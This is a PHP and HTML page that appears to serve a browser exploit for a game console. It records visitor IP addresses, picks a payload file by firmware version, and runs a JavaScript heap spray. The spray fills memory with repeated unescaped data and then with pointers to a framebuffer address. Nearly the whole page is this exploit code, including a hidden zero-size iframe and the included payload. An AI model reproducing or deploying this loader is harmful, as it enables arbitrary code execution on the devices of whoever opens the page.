<?php
if(!isset($version) || !isset($version_name) || !isset($url_filename))
{
	die("Cannot access this page directly");
}

include("stats.php");

if(isset($_SERVER['REMOTE_ADDR']))
{
	insert_stat($_SERVER['REMOTE_ADDR'], $version_name);
}
?>

<html>
<head>
<style>
	html,body{
		margin:0;
		height:100%;
		overflow:hidden;
		background-color: #FFFFFF;
	}
	.pxl { 
		position: absolute;
		width: 1px; height: 1px;
	}
</style>
</head>
<body>
	<form action="" method="POST">
		<input type="hidden" name="version" value="">
		<button type="submit" style="position: absolute; left: 170px; top: 5px;">Change firmware version</button>
	</form>

	<script>
	    var mem = [];

	    <?php
	    // (user facing comments ? i think not)
	    // subscreen framebuffer is at 0x1f05DC00, tiled RGB565
	    // subscreen framebuffer is at 0x1f38ca00, non-tiled RGB565 (actually it's not always there sooooo)
	    ?>

		var data = unescape("\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040");

		function magicfun(mem, size, v) {
			var a = new Array(size - 20);
			nv = v + unescape("%ucccc");
			for (var j = 0; j < a.length / (v.length / 4); j++) a[j] = nv;
			var t = document.createTextNode(String.fromCharCode.apply(null, new Array(a)));

			mem.push(t);
		}

		for (var j = 20; j < 110; j++) {
			magicfun(mem, j, data);
		}

		function dsm(evnt) {
			for (var j = 0; j < 600; j++) {
				magicfun(mem, 200, data);
			}
		}

		dsm();

		data = unescape("\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05");

	</script>

	<?php include("payloads/" . $version["firm"] . "_" . $version["ytb"] . "_payload.html"); ?>
	<?php include($url_filename); ?>

    <iframe width=0 height=0 src="frame.html"></iframe>
</body>
</html>